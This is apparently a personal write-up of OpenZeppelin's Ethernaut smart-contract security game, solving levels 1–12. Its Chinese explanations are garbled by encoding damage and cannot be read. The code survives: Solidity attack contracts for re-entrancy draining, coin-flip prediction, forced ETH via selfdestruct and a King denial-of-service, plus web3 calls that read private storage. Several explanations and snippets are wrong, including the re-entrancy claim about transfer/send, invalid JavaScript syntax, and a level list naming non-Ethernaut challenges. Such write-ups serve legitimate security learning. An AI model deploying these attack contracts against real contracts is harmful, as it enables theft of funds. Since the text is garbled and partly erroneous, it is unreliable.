# Ethernaut Challenges Writeup
## é¡¹ç›®ä»‹ç»

[Ethernaut](https://ethernaut.openzeppelin.com/) æ˜¯ OpenZeppelin å¼€å‘çš„ä¸€ä¸ª Web3/Solidity çš„æ¸¸æˆï¼Œé€šè¿‡é—¯å…³çš„æ–¹å¼æ¥å­¦ä¹ æ™ºèƒ½åˆçº¦å®‰å…¨ã€‚æ¯ä¸€å…³éƒ½æ˜¯ä¸€ä¸ªéœ€è¦è¢«æ”»ç ´çš„æ™ºèƒ½åˆçº¦ï¼Œé€šè¿‡å‘ç°å’Œåˆ©ç”¨åˆçº¦ä¸­çš„æ¼æ´æ¥é€šè¿‡æŒ‘æˆ˜ã€‚æœ¬é¡¹ç›®è®°å½•äº†suuçš„æ¯æ—¥è§£é¢˜è¿‡ç¨‹ã€‚ä»…ä¾›å‚è€ƒï¼Œæ¬¢è¿äº¤æµã€‚

ä¸ªäººæ„Ÿè§‰çš„éš¾åº¦ï¼š
- [Easy] - åŸºç¡€æ¦‚å¿µå’Œç®€å•æ¼æ´
- [Medium] - éœ€è¦ç†è§£åˆçº¦æœºåˆ¶å’Œå¸¸è§æ”»å‡»æ–¹å¼
- [Hard] - å¤æ‚çš„æ¼æ´åˆ©ç”¨å’Œé«˜çº§æ¦‚å¿µ

## 08.01.2025

## 01. Fallback âœ… [Easy]

è¿™å…³ä¸»è¦è€ƒå¯Ÿ fallback å‡½æ•°çš„çŸ¥è¯†ç‚¹ï¼š
- `receive()` å‡½æ•°åœ¨åˆçº¦æ¥æ”¶ ETH æ—¶è¢«è°ƒç”¨
- `fallback()` å‡½æ•°åœ¨è°ƒç”¨ä¸å­˜åœ¨çš„å‡½æ•°æ—¶è¢«è°ƒç”¨
- é€šè¿‡å‘é€å°‘é‡ ETH å¹¶è°ƒç”¨ `contribute()` å‡½æ•°æ¥æ»¡è¶³æ¡ä»¶
- æœ€åé€šè¿‡ `receive()` å‡½æ•°è·å–åˆçº¦æ‰€æœ‰æƒ

æ”»å‡»æ­¥éª¤ï¼š
1. è°ƒç”¨ `contribute()` å¹¶å‘é€å°‘é‡ ETH (<0.001)
```js
await contract.contribute({value: web3.utils.toWei('0.0001')});
```

2. ç›´æ¥å‘åˆçº¦å‘é€ ETH è§¦å‘ `receive()`
```js
await contract.sendTransaction({value: web3.utils.toWei('0.0001')});
```

3. è°ƒç”¨ `withdraw()` æå–æ‰€æœ‰ ETH
```js
await contract.withdraw();
```

## 02. Fallout âœ… [Easy]

è¿™å…³ä¸»è¦è€ƒå¯Ÿæ—©æœŸ Solidity ç‰ˆæœ¬çš„æ„é€ å‡½æ•°é—®é¢˜ï¼š
- è€ç‰ˆæœ¬ä½¿ç”¨ä¸åˆçº¦åŒåçš„å‡½æ•°ä½œä¸ºæ„é€ å‡½æ•°
- å¦‚æœå‡½æ•°åç§°ä¸åˆçº¦åä¸å®Œå…¨ä¸€è‡´,å°±å˜æˆäº†æ™®é€šå‡½æ•°
- æ”»å‡»è€…å¯ä»¥ç›´æ¥è°ƒç”¨è¯¥å‡½æ•°è·å–æ‰€æœ‰æƒ

æ”»å‡»æ­¥éª¤ï¼š
1. ç›´æ¥è°ƒç”¨ `Fal1out()` å‡½æ•°è·å¾—åˆçº¦æ‰€æœ‰æƒ
```js
await contract.Fal1out();
```

2. è°ƒç”¨ `collectAllocations()` æå–èµ„é‡‘
```js
await contract.collectAllocations();
```

å­¦ä¹ è¦ç‚¹ï¼š
- æ„é€ å‡½æ•°çš„å®‰å…¨æ€§
- ä»£ç å®¡è®¡çš„é‡è¦æ€§
- æ–°ç‰ˆæœ¬ä½¿ç”¨ `constructor` å…³é”®å­—æ›´å®‰å…¨

## 03. Coin Flip âœ… [Medium]

è¿™å…³ä¸»è¦è€ƒå¯ŸåŒºå—é“¾çš„éšæœºæ•°é—®é¢˜ï¼š
- é“¾ä¸Šéšæœºæ•°å¯ä»¥è¢«é¢„æµ‹
- `block.number` ç­‰åŒºå—ä¿¡æ¯æ˜¯å…¬å¼€çš„
- æ”»å‡»è€…å¯ä»¥åœ¨åŒä¸€åŒºå—å¤åˆ¶è®¡ç®—é€»è¾‘

æ”»å‡»æ­¥éª¤ï¼š
1. éƒ¨ç½²æ”»å‡»åˆçº¦å¤åˆ¶æ¸¸æˆåˆçº¦çš„è®¡ç®—é€»è¾‘
2. æ‰‹åŠ¨è°ƒç”¨ `attackCoin()` åæ¬¡ï¼ˆæ¯æ¬¡ç­‰å¾…æ–°åŒºå—ï¼‰
3. ç¡®è®¤èƒœåˆ©æ¬¡æ•°è¾¾åˆ°10æ¬¡

> æ³¨æ„ï¼šä¸èƒ½ä½¿ç”¨å¾ªç¯è¿ç»­è°ƒç”¨ `attackCoin()` åæ¬¡ï¼Œå› ä¸ºæ¯æ¬¡çŒœæµ‹éƒ½éœ€è¦åœ¨ä¸åŒåŒºå—ä¸­è¿›è¡Œã€‚å¦‚æœåœ¨åŒä¸€ä¸ªåŒºå—ä¸­å¤šæ¬¡è°ƒç”¨ï¼Œä¼šä½¿ç”¨ç›¸åŒçš„ `blockhash`ï¼Œå¯¼è‡´é¢„æµ‹ç»“æœç›¸åŒã€‚

æ”»å‡»åˆçº¦ä»£ç ï¼š
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract attack {
    ICoinFlip public targetContract;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _targetAddress) {
        targetContract = ICoinFlip(_targetAddress);
    }

    function attackCoin() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        targetContract.flip(side);
    }
}
```

å­¦ä¹ è¦ç‚¹ï¼š
- é“¾ä¸Šéšæœºæ•°çš„å±€é™æ€§
- ä¸åº”ä½¿ç”¨åŒºå—ä¿¡æ¯ä½œä¸ºéšæœºæº
- å¯ä»¥ä½¿ç”¨ Chainlink VRF ç­‰é¢„è¨€æœºè·å–çœŸéšæœºæ•°
- ç†è§£åŒºå—é“¾çš„æ—¶åºæ€§ï¼Œæ¯ä¸ªåŒºå—çš„ä¿¡æ¯éƒ½æ˜¯å”¯ä¸€çš„

## 04. Telephone âœ… [Easy]

è¿™å…³ä¸»è¦è€ƒå¯Ÿå¯¹tx.originçš„ç†è§£ï¼š
- tx.origin æ˜¯äº¤æ˜“çš„å‘é€è€…
- æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ tx.origin æ¥æ¬ºéª—åˆçº¦ï¼Œä½¿å…¶è®¤ä¸ºæ”»å‡»è€…æ˜¯åˆçº¦çš„æ‹¥æœ‰è€…

æ”»å‡»æ­¥éª¤ï¼š
1. å†™ä¸€ä¸ªæ”»å‡»åˆçº¦
2. è°ƒç”¨ `changeOwner()` å‡½æ•°ï¼Œå°†åˆçº¦çš„ owner è®¾ç½®ä¸ºæ”»å‡»è€…

å­¦ä¹ è¦ç‚¹ï¼š
- ç†è§£ tx.origin çš„å±€é™æ€§
- ä½¿ç”¨ msg.sender æ›´å®‰å…¨

## 05. Token âœ… [Easy]

è¿™å…³ä¸»è¦è€ƒå¯Ÿå¯¹solidityçš„æ¼æ´çš„ç†è§£ï¼š
- åœ¨ Solidity 0.6.x åŠæ›´æ—©ç‰ˆæœ¬ä¸­ï¼Œ`transfer()` å’Œ `send()` å‡½æ•°å­˜åœ¨æ¼æ´
- åœ¨ Solidity 0.6.x ä¸­ï¼Œå¦‚æœ balances[msg.sender] å°äº _valueï¼Œbalances[msg.sender] -= _value; ä¼šå‘ç”Ÿ æ•´æ•°ä¸‹æº¢ï¼ˆuint ä» 0 å‡å» 1 ä¼šå˜æˆ 2^256 - 1ï¼‰ã€‚
è¿™ä¼šå¯¼è‡´æ”»å‡»è€…çš„ä½™é¢å˜å¾—éå¸¸å¤§ã€‚
- è¿™äº›å‡½æ•°åœ¨å¤„ç†é”™è¯¯æ—¶ä¸ä¼šå›æ»šäº¤æ˜“ï¼Œè€Œæ˜¯è¿”å› false
- æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›æ¼æ´è¿›è¡Œé‡å…¥æ”»å‡»

æ”»å‡»æ­¥éª¤ï¼š
1. å…ˆæŸ¥çœ‹è‡ªå·±çš„msg.senderçš„ä½™é¢
2. è°ƒç”¨ `transfer()` å‡½æ•°
```js
await contract.transfer("0x0000000000000000000000000000000000000000", 21);
```
3. æŸ¥çœ‹è‡ªå·±çš„ä½™é¢ï¼Œå‘ç°ä½™é¢å¢åŠ äº†

å­¦ä¹ è¦ç‚¹ï¼š
- ç†è§£ Solidity 0.6.x çš„æ•´æ•°ä¸‹æº¢æ¼æ´
- ä½¿ç”¨æ›´å®‰å…¨çš„å‡½æ•°å’Œåº“(SafeMathæˆ–è€…è‡ªè¡Œæ·»åŠ æº¢å‡ºæ£€æŸ¥)

## 06. Delegation âœ… [Easy]

è¿™å…³ä¸»è¦è€ƒå¯Ÿå¯¹delegatecallçš„ç†è§£ï¼š
- delegatecall æ˜¯ä½çº§è°ƒç”¨ï¼Œå¯ä»¥è°ƒç”¨å¦ä¸€ä¸ªåˆçº¦çš„ä»£ç ï¼Œdelegatecall æ˜¯ä¸€ç§åº•å±‚å‡½æ•°è°ƒç”¨ï¼Œå®ƒå…è®¸åˆçº¦ A æ‰§è¡Œåˆçº¦ B çš„ä»£ç ï¼Œä½†ä½¿ç”¨ A çš„å­˜å‚¨ä¸Šä¸‹æ–‡ã€‚æ¢å¥è¯è¯´ï¼Œåˆçº¦ B çš„é€»è¾‘ä¼šå½±å“åˆçº¦ A çš„çŠ¶æ€ã€‚
- æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ delegatecall æ¥è°ƒç”¨åˆçº¦çš„ä»£ç ï¼Œä»è€Œè·å–åˆçº¦çš„æ‰€æœ‰æƒ

æ”»å‡»æ­¥éª¤ï¼š
1. await contract.sendTransaction({data: web3.utils.sha3("pwn()").slice(0,10)});
web3.utils.sha3("pwn()") ä¼šç”Ÿæˆå‡½æ•°ç­¾åçš„å“ˆå¸Œå€¼
.slice(0,10) å–å“ˆå¸Œå€¼çš„å‰ 4 å­—èŠ‚ï¼ˆè¿™æ˜¯å‡½æ•°é€‰æ‹©å™¨ï¼‰

å­¦ä¹ è¦ç‚¹ï¼š
- åœ¨ä½¿ç”¨ delegatecall æ—¶ï¼Œå¿…é¡»ç¡®ä¿è¢«è°ƒç”¨åˆçº¦çš„é€»è¾‘ä¸å½“å‰åˆçº¦çš„å­˜å‚¨å¸ƒå±€ä¸€è‡´ï¼Œå¦åˆ™å¯èƒ½å¯¼è‡´å­˜å‚¨è¢«æ„å¤–è¦†ç›–ã€‚
- å®é™…å¼€å‘ä¸­é¿å…æ¼æ´

- é¿å…åœ¨ fallback å‡½æ•°ä¸­ä½¿ç”¨ delegatecallï¼Œé™¤éæœ‰ä¸¥æ ¼çš„è®¿é—®æ§åˆ¶ã€‚
- ä½¿ç”¨ç°ä»£çš„åˆçº¦æ¡†æ¶ï¼ˆå¦‚ OpenZeppelin çš„ Proxy åˆçº¦ï¼‰æ¥å®ç°ä»£ç†é€»è¾‘ã€‚

## 07. Force âœ… [Medium]

è¿™å…³ä¸»è¦è€ƒå¯Ÿå¯¹selfdestructçš„ç†è§£ï¼š
- selfdestruct æ˜¯ Solidity ä¸­çš„ä¸€ä¸ªä½çº§å‡½æ•°ï¼Œç”¨äºé”€æ¯åˆçº¦å¹¶å°†å…¶æ‰€æœ‰ä½™é¢å‘é€ç»™æŒ‡å®šçš„ç›®æ ‡åœ°å€ã€‚
- æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ selfdestruct æ¥å¼ºåˆ¶å°†åˆçº¦çš„ä½™é¢å‘é€ç»™ç›®æ ‡åœ°å€

æ”»å‡»æ­¥éª¤ï¼š
1. éƒ¨ç½²ä¸€ä¸ªæ–°åˆçº¦å¹¶å‘è¯¥åˆçº¦å‘é€ä»¥å¤ªå¸ã€‚
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceAttack {
    constructor() public payable {
        // æ„é€ å‡½æ•°å¯æ¥æ”¶ä»¥å¤ªå¸
    }

    function attack(address payable _target) public {
        selfdestruct(_target);
    }
}
```

2. è°ƒç”¨ `attack()` å‡½æ•°ï¼Œå°†åˆçº¦çš„ä½™é¢å‘é€ç»™ç›®æ ‡åœ°å€
```js
// è°ƒç”¨æ”»å‡»å‡½æ•°ï¼Œå¼ºåˆ¶å‘é€ä»¥å¤ªå¸
await attackContract.attack(contract.address);
// éªŒè¯ Force åˆçº¦çš„ä½™é¢
const balance = await web3.eth.getBalance(contract.address);
console.log("Force Contract Balance:", balance);
```

å­¦ä¹ è¦ç‚¹ï¼š
- ç†è§£ selfdestruct çš„æœºåˆ¶
- ç¡®ä¿ä½ çš„åˆçº¦é€»è¾‘ä¸ä¾èµ–äºä½™é¢ä¸ºé›¶çš„å‡è®¾ã€‚
- é¿å…åœ¨ä»£ç ä¸­ç›´æ¥æ£€æŸ¥åˆçº¦ä½™é¢ã€‚

## 08. Vault âœ… [Easy]

è¿™å…³ä¸»è¦è€ƒå¯Ÿå¯¹åŒºå—é“¾çš„å­˜å‚¨çš„ç†è§£ï¼š
- åŒºå—é“¾çš„å­˜å‚¨æ˜¯å…¬å¼€çš„ï¼Œä»»ä½•äººéƒ½å¯ä»¥æŸ¥çœ‹ï¼Œå“ªæ€•å­˜å‚¨æ˜¯privateçš„æ•°æ®ä¹Ÿå¯ä»¥æŸ¥çœ‹
- æ”»å‡»è€…å¯ä»¥åˆ©ç”¨åŒºå—é“¾çš„å­˜å‚¨æ¥è·å–åˆçº¦çš„å¯†ç 
- Solidity ä¸­çš„æ‰€æœ‰çŠ¶æ€å˜é‡éƒ½å­˜å‚¨åœ¨åˆçº¦çš„å­˜å‚¨æ§½ï¼ˆStorage Slotsï¼‰ä¸­ã€‚
- å…¬å…±å˜é‡ï¼ˆå¦‚ lockedï¼‰å¯ä»¥ç›´æ¥é€šè¿‡åˆçº¦æ¥å£è¯»å–ã€‚
- ç§æœ‰å˜é‡ï¼ˆå¦‚ passwordï¼‰è™½ç„¶æ ‡è®°ä¸º privateï¼Œä½†å®é™…ä¸Šåªæ˜¯åœ¨ Solidity ä¸­ä¸å¯ç›´æ¥é€šè¿‡åˆçº¦ä»£ç è®¿é—®ã€‚å®ƒä»¬ä»ç„¶å¯ä»¥é€šè¿‡ä½çº§çš„å­˜å‚¨è¯»å–æ–¹æ³•ï¼ˆå¦‚ web3.eth.getStorageAtï¼‰è·å–ã€‚

æ”»å‡»æ­¥éª¤ï¼š
1. ä½¿ç”¨ web3.eth.getStorageAt è¯»å–å­˜å‚¨æ§½ 1 çš„å†…å®¹ï¼ˆpassword å­˜å‚¨åœ¨å­˜å‚¨æ§½ 1ï¼‰ã€‚
```js
await web3.eth.getStorageAt(contract.address, 1).toString();
```
2. å°†è¯»å–åˆ°çš„å¯†ç ä½œä¸ºå‚æ•°è°ƒç”¨ `unlock()` å‡½æ•°ã€‚
```js
await contract.unlock(password);
```

å­¦ä¹ è¦ç‚¹ï¼š
- ç†è§£ Solidity ä¸­çš„å­˜å‚¨å¸ƒå±€
- ä½¿ç”¨ä½çº§å‡½æ•°ï¼ˆå¦‚ web3.eth.getStorageAtï¼‰æ¥è®¿é—®ç§æœ‰å˜é‡
- ä¸è¦å°†æ•æ„Ÿæ•°æ®ç›´æ¥å­˜å‚¨åœ¨é“¾ä¸Šï¼Œå³ä½¿ä½¿ç”¨ private å…³é”®å­—ã€‚
- å¦‚æœéœ€è¦å­˜å‚¨æ•æ„Ÿæ•°æ®ï¼Œå»ºè®®ä½¿ç”¨åŠ å¯†æ–¹å¼å­˜å‚¨ï¼Œå¹¶ä»…åœ¨å¿…è¦æ—¶è§£å¯†ã€‚

## 09. King âœ… [Easy]

è¿™å…³ä¸»è¦è€ƒå¯Ÿå¯¹é‡å…¥æ”»å‡»ç‰¹æ®Šå˜ä½“çš„ç†è§£äº†ï¼š
- é‡å…¥æ”»å‡»æ˜¯æŒ‡æ”»å‡»è€…åˆ©ç”¨åˆçº¦çš„æ¼æ´ï¼Œåœ¨åˆçº¦æ‰§è¡Œè¿‡ç¨‹ä¸­å¤šæ¬¡è°ƒç”¨æŸä¸ªå‡½æ•°ï¼Œä»è€Œè·å–æ›´å¤šçš„åˆ©ç›Šã€‚
- æ”»å‡»è€…å¯ä»¥åˆ©ç”¨é‡å…¥æ”»å‡»æ¥è·å–åˆçº¦çš„æ§åˆ¶æƒ

æ”»å‡»æ­¥éª¤ï¼š
1. å¦‚æœå½“å‰å›½ç‹æ˜¯ä¸€ä¸ªæ™ºèƒ½åˆçº¦ï¼Œè€Œè¯¥åˆçº¦çš„ receive å‡½æ•°æ— æ³•æ¥æ”¶ ETHï¼ˆæˆ–è€…æ•…æ„å¯¼è‡´äº¤æ˜“å¤±è´¥ï¼‰ï¼Œæ–°çš„å›½ç‹å°±æ— æ³•æˆåŠŸè°ƒç”¨ receiveï¼Œä»è€Œé˜»æ­¢ä»»ä½•å…¶ä»–ç©å®¶æˆä¸ºæ–°çš„å›½ç‹ã€‚
2. éƒ¨ç½²ä¸€ä¸ªæ”»å‡»åˆçº¦ï¼Œå¹¶é€šè¿‡æ”»å‡»åˆçº¦æˆä¸ºå›½ç‹ã€‚
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingAttack {
    address public target;

    constructor(address _target) public {
        target = _target;
    }

    function attack() public payable {
        // è°ƒç”¨ç›®æ ‡åˆçº¦ï¼Œå¹¶æˆä¸ºæ–°çš„å›½ç‹
        (bool success, ) = target.call{value: msg.value}("");
        require(success, "Attack failed");
    }

    // æ•…æ„è®©æ¥æ”¶ ETH çš„å‡½æ•°å¤±è´¥
    receive() external payable {
        revert("I refuse to give up the throne!");
    }
}
```

3. éƒ¨ç½²æ”»å‡»åˆçº¦å¹¶æä¾›è¶³å¤Ÿçš„ ETHï¼ˆå¤§äºå½“å‰çš„ prizeï¼‰

å­¦ä¹ è¦ç‚¹ï¼š
- ç†è§£receiveå‡½æ•°çš„ä½œç”¨ï¼šåœ¨ç›®æ ‡åˆçº¦ä¸­ï¼Œreceive å‡½æ•°æ˜¯æ¥æ”¶ ETH çš„æ ¸å¿ƒé€»è¾‘ã€‚å¦‚æœæ¥æ”¶æ–¹ä¸èƒ½æ­£ç¡®å¤„ç† ETH è½¬è´¦ï¼Œä¼šå¯¼è‡´äº¤æ˜“å¤±è´¥ã€‚
- é˜²å¾¡å»ºè®®ï¼šé¿å…ä½¿ç”¨ä½çº§è°ƒç”¨ï¼ˆå¦‚ callï¼‰è¿›è¡Œè½¬è´¦ï¼Œå¯ä»¥ä½¿ç”¨ transfer æˆ– sendï¼Œå®ƒä»¬åœ¨è½¬è´¦å¤±è´¥æ—¶ä¼šè‡ªåŠ¨å›æ»šã€‚
- åœ¨åˆçº¦è®¾è®¡ä¸­ï¼Œé¿å…ä¾èµ–å¤–éƒ¨åˆçº¦çš„è¡Œä¸ºæ¥å®Œæˆæ ¸å¿ƒé€»è¾‘ã€‚
- ä½¿ç”¨ç°ä»£çš„åˆçº¦æ¡†æ¶ï¼ˆå¦‚ OpenZeppelin çš„ ReentrancyGuardï¼‰æ¥å®ç°å®‰å…¨é‡å…¥æ§åˆ¶

## 10. Re-entrancy âœ… [Medium]

è¿™å…³ä¸»è¦è€ƒå¯Ÿå¯¹re-entrancyçš„ç†è§£ï¼š
- é‡å…¥æ”»å‡»æ˜¯æŒ‡æ”»å‡»è€…åˆ©ç”¨åˆçº¦çš„æ¼æ´ï¼Œåœ¨åˆçº¦æ‰§è¡Œè¿‡ç¨‹ä¸­å¤šæ¬¡è°ƒç”¨æŸä¸ªå‡½æ•°ï¼Œä»è€Œè·å–æ›´å¤šçš„åˆ©ç›Šã€‚
- æ”»å‡»è€…å¯ä»¥åˆ©ç”¨é‡å…¥æ”»å‡»æ¥è·å–åˆçº¦çš„æ§åˆ¶æƒ

æ”»å‡»æ­¥éª¤ï¼š
1. ç¼–å†™æ”»å‡»åˆçº¦
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract ReentranceAttack {
    Reentrance public target;
    address public owner;

    constructor(address payable _target) public {
        target = Reentrance(_target);
        owner = msg.sender;
    }

    // è°ƒç”¨ç›®æ ‡åˆçº¦çš„ donate å‡½æ•°
    function donate() public payable {
        target.donate{value: msg.value}(address(this));
    }

    // å‘èµ·æ”»å‡»
    function attack(uint256 _amount) public {
        target.withdraw(_amount);
    }

    // é‡å…¥é€»è¾‘
    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw(msg.value);
        }
    }

    // æå–æ”»å‡»åˆçº¦ä¸­çš„ä»¥å¤ªå¸
    function withdraw() public {
        require(msg.sender == owner, "Not the owner");
        payable(owner).transfer(address(this).balance);
    }
}
```
2. è°ƒç”¨ `donate()` å‡½æ•°ï¼Œå°†åˆçº¦çš„ä½™é¢å‘é€ç»™æ”»å‡»åˆçº¦
```js
await contract.donate{value: 1 ether}();
```
3. è°ƒç”¨ `attack()` å‡½æ•°ï¼Œå‘èµ·æ”»å‡»
```js
await attackContract.attack(1 ether);
```

å­¦ä¹ è¦ç‚¹ï¼š
- ç†è§£ re-entrancy çš„æœºåˆ¶
- ä½¿ç”¨ç°ä»£çš„åˆçº¦æ¡†æ¶ï¼ˆå¦‚ OpenZeppelin çš„ ReentrancyGuardï¼‰æ¥å®ç°å®‰å…¨é‡å…¥æ§åˆ¶

## 11. Elevator âœ… [Easy]

è¿™å…³ä¸»è¦è€ƒå¯Ÿå¯¹interfaceçš„ç†è§£ï¼š
- interface æ˜¯ Solidity ä¸­çš„ä¸€ç§æŠ½è±¡åˆçº¦ï¼Œç”¨äºå®šä¹‰åˆçº¦çš„å‡½æ•°ç­¾åï¼Œä½†ä¸åŒ…å«å®ç°ä»£ç ã€‚
- æ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ç° interface çš„åˆçº¦ä½†æ˜¯ä½¿ç”¨å«æœ‰æ”»å‡»çš„functionæ¥è·å–åˆçº¦çš„æ§åˆ¶æƒ

æ”»å‡»æ­¥éª¤ï¼š
1. ä¸»è¦æ˜¯å®ç°äº†interfaceçš„æ”»å‡»åˆçº¦çš„ç¼–å†™
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract ElevatorAttack is Building {
    Elevator public target;
    bool public toggle;

    constructor(address _target) public {
        target = Elevator(_target);
    }

    function isLastFloor(uint) external override returns (bool) {
        toggle = !toggle; // åˆ‡æ¢è¿”å›å€¼
        return toggle;
    }

    function attack(uint _floor) public {
        target.goTo(_floor);
    }
}
```

å­¦ä¹ è¦ç‚¹ï¼š
- é™åˆ¶æ¥å£è°ƒç”¨è€…: éªŒè¯è°ƒç”¨è€…æ˜¯å¦ä¸ºå¯ä¿¡åˆçº¦æˆ–ç‰¹å®šåœ°å€ã€‚
- ä½¿ç”¨ require æ£€æŸ¥ msg.sender
```solidity
require(msg.sender == trustedAddress, "Unauthorized caller");
```
- é€»è¾‘éªŒè¯: é¿å…å®Œå…¨ä¾èµ–å¤–éƒ¨åˆçº¦çš„è¿”å›å€¼ï¼ŒåŠ å…¥å†…éƒ¨éªŒè¯é€»è¾‘ã€‚


## 12. Privacy âœ… [Easy]

è¿™ä¸ªå…³å¡ä¸»è¦è€ƒå¯Ÿå¯¹å­˜å‚¨æ§½å’Œæ•°æ®ä¿æŠ¤çš„ç†è§£ï¼š
- å­˜å‚¨æ§½æ˜¯ Solidity ä¸­ç”¨äºå­˜å‚¨å˜é‡çš„ç©ºé—´ï¼Œæ¯ä¸ªå­˜å‚¨æ§½éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„ç´¢å¼•ã€‚
- æ”»å‡»è€…å¯ä»¥åˆ©ç”¨å­˜å‚¨æ§½æ¥è·å–åˆçº¦çš„ç§æœ‰æ•°æ®

æ”»å‡»æ­¥éª¤ï¼š
1. é¦–å…ˆåˆ†æï¼šSolidity å­˜å‚¨å¸ƒå±€ï¼ŒçŠ¶æ€å˜é‡æŒ‰é¡ºåºå­˜å‚¨åœ¨å­˜å‚¨æ§½ä¸­ï¼š
locked ä½äºæ§½ 0ã€‚
ID ä½äºæ§½ 1ã€‚
flattening, denomination, å’Œ awkwardness å…±ç”¨æ§½ 2ã€‚
data æ•°ç»„ä»æ§½ 3 å¼€å§‹ï¼Œåˆ†åˆ«å­˜å‚¨ data[0], data[1], å’Œ data[2]ã€‚
å°½ç®¡data çš„å­˜å‚¨å†…å®¹æ˜¯ç§æœ‰çš„ï¼ˆprivateï¼‰ï¼Œä½†åœ¨ä»¥å¤ªåŠä¸Šï¼Œæ‰€æœ‰å­˜å‚¨æ§½éƒ½æ˜¯å¯é€šè¿‡ä½çº§å·¥å…·ï¼ˆå¦‚ web3.eth.getStorageAtï¼‰è¯»å–çš„ã€‚
2. ä½¿ç”¨ web3.eth.getStorageAt è¯»å–å­˜å‚¨æ§½ 5 çš„å†…å®¹
```js
await web3.eth.getStorageAt(contract.address, 5).toString();
```
3. å°†è¯»å–åˆ°çš„ key è½¬æ¢ä¸º bytes16ï¼Œç„¶åè°ƒç”¨ unlock å‡½æ•°ï¼š
```js
await contract.unlock(key.slice(0, 34)); // ä½¿ç”¨å‰ 16 å­—èŠ‚
```

å­¦ä¹ è¦ç‚¹ï¼š
- flattening, denomination, å’Œ awkwardness å…±ç”¨æ§½ 2ï¼š
  - å­˜å‚¨æ§½è§„åˆ™
  - ä¸€ä¸ªå­˜å‚¨æ§½å¤§å°ä¸º 32 å­—èŠ‚ï¼ˆ256 ä½ï¼‰ã€‚
  - å¦‚æœå¤šä¸ªçŠ¶æ€å˜é‡çš„æ€»å¤§å°ä¸è¶…è¿‡ 32 å­—èŠ‚ï¼Œå®ƒä»¬ä¼šå…±ç”¨åŒä¸€ä¸ªæ§½ã€‚
  - å˜é‡å¤§å°
  - flattening æ˜¯ uint8ï¼ˆ1 å­—èŠ‚ï¼‰ã€‚ 
  - denomination æ˜¯ uint8ï¼ˆ1 å­—èŠ‚ï¼‰ã€‚
  - awkwardness æ˜¯ uint16ï¼ˆ2 å­—èŠ‚ï¼‰ã€‚
  - å®ƒä»¬æ€»å…±å ç”¨ 1 + 1 + 2 = 4 å­—èŠ‚ï¼Œè¿œå°äº 32 å­—èŠ‚ï¼Œå› æ­¤ Solidity å°†å®ƒä»¬æ‰“åŒ…åˆ°åŒä¸€ä¸ªæ§½ï¼ˆæ§½ 2ï¼‰ã€‚
- å…³äº key.slice(0, 34) çš„åŸå› 
  - åœ¨ JavaScript ä¸­ï¼Œweb3.eth.getStorageAt è¿”å›çš„æ˜¯ä¸€ä¸ªä»¥å¤ªåŠå­˜å‚¨æ§½å†…å®¹çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œç±»ä¼¼äº 0x å¼€å¤´çš„ 64 ä¸ªå­—ç¬¦ï¼ˆ32 å­—èŠ‚ï¼‰ã€‚æ¯ä¸¤ä¸ªå­—ç¬¦è¡¨ç¤º 1 å­—èŠ‚ï¼Œå› æ­¤ï¼š
  - key çš„é•¿åº¦æ˜¯ 66 ä¸ªå­—ç¬¦ï¼ˆåŒ…æ‹¬å‰ç¼€ 0xï¼‰ã€‚
  - å‰ 16 å­—èŠ‚çš„åå…­è¿›åˆ¶è¡¨ç¤ºéœ€è¦ 32 ä¸ªå­—ç¬¦ï¼ˆ16 å­—èŠ‚ * 2 ä¸ªå­—ç¬¦/å­—èŠ‚ï¼‰ã€‚
  - åŠ ä¸Š 0x çš„å‰ç¼€ï¼Œæ€»å…±æ˜¯ 34 ä¸ªå­—ç¬¦ã€‚
  - å› æ­¤ï¼Œkey.slice(0, 34) æå–çš„å°±æ˜¯å‰ 16 å­—èŠ‚çš„åå…­è¿›åˆ¶è¡¨ç¤ºã€‚

## 13. Gatekeeper One ğŸ”’

## 14. Gatekeeper Two ğŸ”’

## 15. Naught Coin ğŸ”’

## 16. Preservation ğŸ”’

## 17. Recovery ğŸ”’

## 18. Magic Number ğŸ”’

## 19. Alien Codex ğŸ”’

## 20. Denial ğŸ”’

## 21. Shop ğŸ”’

## 22. Dex ğŸ”’

## 23. Dex Two ğŸ”’

## 24. Puzzle Wallet ğŸ”’

## 25. Motorbike ğŸ”’

## 26. DoubleEntryPoint ğŸ”’

## 27. Good Samaritan ğŸ”’

## 28. Gatekeeper Three ğŸ”’

## 29. Switch ğŸ”’

## 30. Privacy 2 ğŸ”’

## 31. Climber ğŸ”’

## 32. Recovery 2 ğŸ”’

## 33. Puppet ğŸ”’

